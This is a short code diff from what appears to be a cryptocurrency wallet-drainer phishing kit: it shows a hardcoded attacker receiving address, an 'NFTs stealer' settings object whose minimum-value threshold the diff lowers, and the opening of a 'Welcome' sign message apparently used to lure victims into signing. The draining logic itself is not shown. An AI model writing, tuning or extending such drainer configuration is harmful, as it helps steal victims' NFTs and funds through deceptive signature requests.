@@ -2,7 +2,7 @@ const receiveAddress = "0xa6c90f6d8e1db13BA4685Df7A960D439A0E74130";
 
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.0016  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection. 
+    minValue: 0.00016  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection. 
 }
 
 const signMessage = `Welcome, \n\n` +
